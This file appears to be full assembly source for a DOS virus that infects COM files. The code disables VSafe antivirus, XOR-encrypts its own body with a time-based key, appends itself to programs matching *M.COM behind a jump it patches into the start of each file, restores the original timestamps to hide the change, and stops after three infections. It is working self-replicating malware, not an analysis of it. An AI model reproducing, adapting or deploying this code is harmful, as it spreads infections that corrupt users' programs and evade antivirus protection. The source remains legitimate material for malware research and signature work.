.model tiny
.radix 16
.code

        org 100h

byt             equ     end_it - where
virus_size      equ     end_it - start

start:  mov     si,si
        nop
        nop
        mov     ax,0fa01h               ; unload Vsafe 
        mov     dx,5945h
        int     16h
        call    virus                   ; push ip onto stack
virus:  mov     di,sp                   ; mov stack pointer to di
        mov     bp,word ptr ss:[di]     ; thanks to The Unforgiven
        sub     bp,10f                  ; for this code
        inc     sp                      ; read loc into bp
        inc     sp                      ; inc sp � to correct

        call    decr                    ; on the first run the encrypt value
                                        ; is -0- so no change on subsquent
                                        ; runs the random value is stored into
                                        ; enc_val so file is decrypted
        
        jmp     tree 

        nop                             ; marker
        nop                             ; marker
        nop                             ; marker
        enc_val db      0               ; this is the value that we will 
        counter db      0               ; encrypt with, its zero to start
        nop                             ; then changes on subquent infections
        nop                             ; marker
enc:    mov     ah,2c                   ; dos get time function  
        int     21                      ; dos does it 
        mov     [bp+enc_val],cl         ; move the minute into the encryption
                                        ; value, this allows for 59 variations


decr:   mov cx,byt                      ; byt is the number of bytes to xor 
        lea si,[bp+offset where]     ; point si at the start of the actual 
                                        ; virus 
dec_lp: lea di,[bp+offset buff]         ; point di at the buffer 
        movsb                           ; move the byte at si into the buffer
        mov al,[bp+offset buff]         ; move the buffer into al 
        xor al,[bp+enc_val]             ; xor the al with the enc_val 
        mov [bp+offset buff],al         ; move the byte back into the buffer
        lea di,[si-1]                   ; point di back to where the byte came from
        lea si,[bp+offset buff]         ; point si at the buffer 
        movsb                           ; mov si to di buffer back into the virus
        mov si,di                       ; movsb increments after each use 
        loop dec_lp                     ; loop X number of times X=byt
        ret                             ; done with this function bail


tree:   jmp    where                    ; this is the actual virus                  

        
what:   call    enc                     ; encrypt the main part of the virus
        
        mov     ah,40                   ; Write file
        mov     cx,virus_size           ; Write the virus size
        lea     dx,[bp+offset start]    ; Load the offset of the
                                        ; virus into dx
        int     21                      ; dos function 
        inc     [bp+counter]            ; got one increase the counter
        jmp     $+2                     ; Thanks Screaming  
        call    decr                     ; decrypt the virus so we can continue
        ret                             ; return back to the main body 


where:  lea     bx,[bp+offset return_bytes] ; Load the address
                                        ; of bp plus the original offset
                                        ; of return bytes into di.
        push    ds:[bx]                 ; push the first two bytes of the
                                        ; original program onto the stack
        add     bx,02                   ; increase di to point to the next
                                        ; two bytes we saved of the orig prog
        push    ds:[bx]                 ; push the last two bytes we saved
                                        ; of the original program onto the
                                        ; stack
                
                
        mov     ah,1a                   ; Set DTA
        lea     dx,[bp+offset end_it]   ; Load the effective address
                                        ; of the end of the virus to
                                        ; be used for the new DTA
        int     21                      ; dos call
        
        
        mov     ah,4e                   ; Find the first match
get_f:  lea     dx,[bp+offset filemask] ; Load the offset filemask dx
        int     21                      ; dos call
        jc      Jp_err                  ; can't find the file name outahere
        jmp     getbad                  ; sloppy jump to get over near
jp_err: jmp  exit_error                 ; jump problem
getbad: mov     ah,2f                   ; get the new DTA
        int     21                      ; this is returned in bx
        xor     ax,ax                   ; clear up ax
                
                
        lea     dx,[bp+offset end_it+1e]  ; Load the offset fname (�)
        Mov     Cl, 7Ah                 ; This loads 7a04 into ax
        Xchg    Ah, Cl                  ; shr makes 7a04 into 3d02
        Mov     Al, 04h                 ; '   '
        Shr     Ax,1                    ; Open The File Up
        int     21                       
        
        
        ;mov     ax,3d02                 ; open file function - read/write
        ;int     21                      ; dos call 
                
                
                  
        xchg    bx,ax                   ; move the file handle into BX
                
        mov     ax,5700                 ; get the files original date
        int     21                      ; and time and move this 
        mov     [bp+date],dx            ; value to date/ time
        mov     [bp+time],cx            ; move cd into buffer 
                
        lea     di,[bp+offset end_it+1a] ; Load the offset fsize (�)
        mov     ax,word ptr ds:[di]     ; Move this fsize into ax
        sub     ax,3                    ; Take off three to build jmp
        mov     word ptr [bp+jump_address+1],ax ; save these bytes
                                        ; at jump address+1 which is
                                        ; jmp (xx xx+3) or 0e9 xx xx
               
        mov     ah,3f                   ; Read file
        mov     cx,4                    ; Read 4 bytes
        lea     dx,[bp+offset return_bytes]     ; Load the offset dx
        int     21                      ; dos call
        lea     di,[bp+offset return_bytes+3]   ; Load the offset of
                                        ; the fourth byte
                                        ; we just read into
                                        ; the virus
        cmp     byte ptr ds:[di],90     ; Is this byte a nop?
        je      nxtvic                  ; If so assume infected,
                                        ; close file, and run
                                        ; infection cycle again
               
               
        mov     ax,4200                 ; Goto beginning of file
        xor     cx,cx                   ; cx must be 0  
        xor     dx,dx                   ; dx must be 0
        int     21                      ; dos call
                
        mov     ah,40                   ; Write file
        mov     cx,4                    ; Write four bytes
        lea     dx,[bp+offset jump_address]     ; Load the offset of 
                                        ; the bytes to write 
                                        ; (which is our jmp constuction)
        int     21                      ; dos call 
        mov     ax,4202                 ; Goto end of file
        xor     cx,cx                   ; cx must be 0
        xor     dx,dx                   ; dx must be 0
        int     21                      ; dos call 
        call    what                    ; this is the actual part tha writes
        jmp     $+2                     ; thanks again screaming
exit_n: mov     cx,[bp+time]            ; Write the original date
        mov     dx,[bp+date]            ; back to the infected file 
        mov     ax,5701                 ; dos write date function 
        int     21                      ; dos call 
        mov     ah,3e                   ; Close the file, the
                                        ; infection is complete
        int     21                      ; dos call 
        cmp     [bp+counter],03         ; how many files do you want to infect?
        je      exit_error
nxtvic: mov     ah,4f                   ; Continue the infection
                                        ; process.  Find the next match!
        jmp     get_f                   ; Doit again, and stop only
                                        ; when int 21 ah=4f reports
                                        ; no more matches!
exit_error:     cli                     ; clear interupts 
        mov     ah,1a                   ; Set DTA
        mov     dx,80                   ; Change to original DTA
        int     21                      ; dos call 
        mov     bx,102                  ; Set bx to 102
        pop     [bx]                    ; pop the last two saved
                                        ; bytes into ds:[102]
        dec     bx                      ; decrease bx so that is
        dec     bx                      ; points to 100
        pop     [bx]                    ; pop the first two saved
                                        ; bytes into ds:[100]
        push    bx                      ; bx=100
        xor     ax,ax                   ; most viruses don't do this
        xor     bx,bx                   ; sequence, but since some
        xor     cx,cx                   ; programs assume the reg's
        xor     dx,dx                   ; are set to 0 like they
        xor     bp,bp                   ; should be, this is an
        xor     si,si                   ; extra precaution.
        xor     di,di
        ret                             ; return to host
buff            db      ?
date            dw      ? 
time            dw      ?
filemask        db      '*M.COM',0              ; Look for *.com's
jump_address    db      0e9,0,0,90              ; jmp xx xx+3, and 90 is the
new_dta         dw      ?                       ; infection marker
how_much        dw      ?
return_bytes    db      0cdh,20,0,0             ; simple way to end the
                                                ; first generation (it's
end_it:                                         ; the same as saying int 20)       
                                         
end start
end code 
